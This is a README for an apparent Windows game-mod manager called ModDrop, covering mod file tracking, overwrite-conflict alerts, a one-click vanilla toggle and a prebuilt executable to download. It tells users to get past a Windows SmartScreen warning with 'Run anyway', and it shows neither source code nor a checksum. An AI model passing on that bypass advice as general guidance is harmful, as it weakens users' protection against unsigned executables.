<p align="center">
  <img src="https://i.postimg.cc/2S14qGvV/banner.png" alt="ModDrop Universal Mod Installer — Drag-and-Drop ZIP/PAK Manager & Vanilla Toggle" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Universal%20Mod%20Manager-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-moddrop--v1.2-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# ModDrop Universal Mod Installer — Drag-and-Drop ZIP/PAK Manager & Vanilla Toggle

**Installing mods manually by extracting ZIPs straight into game folders—then struggling to figure out which files to delete when a patch breaks or you want to play online? Track every installed mod file, detect overwrites, and toggle Vanilla mode in one click.**

ModDrop Universal Mod Installer brings clean manifest tracking to any PC game folder: **logging every extracted `.pak`, `.dll`, or loose asset file per mod archive, warning before two mods overwrite the same file, and moving active mods to a staging folder when you toggle Vanilla Mode**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) PC gamers** modding single-player games (`~mods`, `Mods`, `BepInEx\plugins`, or root folder mods) who want clean uninstalls without reinstalling the whole game.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Game update crashes on startup because of leftover manual mod files | Extracting ZIPs directly into game folders leaves orphaned files behind | Track every file per mod and click **Disable All Mods (Vanilla Mode)** |
| Two mods silently overwrite the same config or `.pak` file | Manual extraction gives no warning when mod files collide | Inspect exact file-level conflict alerts before enabling overlapping mods |
| Forgetting to remove single-player mods before launching online co-op | Leftover modded DLLs/PAKs trigger version mismatches or anti-cheat kicks | Toggle **Vanilla Mode** in 1 click before joining multiplayer sessions |
| Uninstalling a mod leaves overwritten vanilla files broken | Original game files were replaced without a backup | Automatically back up any overwritten stock files to `_VanillaBackup` |

## Download for Windows

[**Download ModDrop.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/ModDrop.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `ModDrop.exe`? (Key features)

- Installs `.zip`, `.7z`, `.rar`, and `.pak` mod archives via drag-and-drop with full file-manifest tracking.
- Detects **file-overwrite conflicts** between installed mods before applying changes.
- Automatically backs up any replaced original game files into `_VanillaBackup` for lossless uninstallation.
- One-click **Disable All Mods (Vanilla Toggle)** cleanly stashes active mods before game patches or multiplayer.

### Sample Output

```text
[ModDrop] Game Profile: ClairObscur_UE5 (Target: Content\Paks\~mods)
[OK]   Installed [1]    : Ultrawide_HUD_Fix_P.pak (1 file | 0 conflicts)
[WARN] Conflict Alert   : BetterLighting_P.pak shares 'GlobalShader.ini' with Preset_v1
[OK]   Vanilla Toggle   : Ready (All 4 active mods can be stashed in 1 click)
```

The release ZIP is named `ModDrop.zip`; the Windows executable inside is named `ModDrop.exe`.

1. Close ModDrop before updating or replacing executable files.
2. Click **Download ModDrop.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `ModDrop.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with read/write access to your game installation folders.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `ModDrop.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### No more 'Verify Integrity of Game Files' just to uninstall a mod

Because ModDrop records every file each archive places, disabling or uninstalling a mod removes it cleanly.

### Catching mod-on-mod file overwrites early

Highlights exact conflicting relative paths before you launch the game.

### Safe 1-click switch between Modded Single-Player and Vanilla

Stashes active mods cleanly without deleting your load order.

### Works with Unreal `~mods`, Unity `BepInEx`, and loose-file games

Configure any target subfolder per game profile.

## Default folders and configuration paths

ModDrop stores mod manifests and stashed archives inside a `.moddrop` folder in your game profile:

```text
<GameInstallFolder>\.moddrop\
```

Typical directory layout:

```text
<GameInstallFolder>\
├── Content\Paks\~mods\      (Active enabled mods)
└── .moddrop\
    ├── manifest.json         (Tracked files & load order)
    ├── StashedMods\          (Disabled mods in Vanilla Mode)
    └── _VanillaBackup\       (Original replaced stock files)
```

Never install mods into games protected by kernel anti-cheat (Easy Anti-Cheat, BattlEye, Vanguard) unless the game explicitly provides an offline/unprotected launch mode.

## Quick start guide

Follow these steps to get started:

1. **Extract `ModDrop.zip` and launch `ModDrop.exe`.** Create a game profile and select your game's mod directory (e.g., `~mods` or `BepInEx\plugins`).
2. **Drag downloaded `.zip`, `.7z`, or `.pak` mod archives into ModDrop.** Review any file-conflict warnings before enabling.
3. **Click **Disable All Mods** before installing major game patches or playing online.** Re-enable your entire mod list in one click afterward.

### Data safety note

ModDrop backs up replaced stock files automatically to `_VanillaBackup`.

## What the status summary shows

ModDrop displays **enabled mod count, tracked file count, file-conflict warnings, and Vanilla/Modded profile status**.

## FAQ

**Does ModDrop work with Unreal Engine `~mods` folders?**

Yes—you can drop `.pak` or `.zip` archives directly into any game's `~mods` profile.

**How does the 1-click Disable All Mods button work?**

It moves all tracked mod files into `.moddrop\StashedMods` and restores any backed-up vanilla files so the game folder is completely clean.

**Does it require an account or internet connection?**

No. ModDrop is a 100% offline local mod manager.

## Useful reading

- [PCGamingWiki — Modding Glossary & Folder Conventions](https://www.pcgamingwiki.com/wiki/Glossary:Modding)

## More Windows Desktop Utilities

- [CloudSave-UniversalGameSync](../CloudSave-UniversalGameSync) — Automatic save folder synchronizer for non-Steam Cloud games
- [WidescreenFix-FOVConfigPatcher](../WidescreenFix-FOVConfigPatcher) — 21:9 & 32:9 ultrawide aspect ratio hex & INI config patcher
- [CoopHost-GameServerManager](../CoopHost-GameServerManager) — 1-click dedicated server manager for Minecraft, Palworld & Valheim
- [SteamJunction-LibraryMover](../SteamJunction-LibraryMover) — Move Steam/Epic games between SSDs via NTFS Junctions

*Independent open-source desktop utility for Windows.*
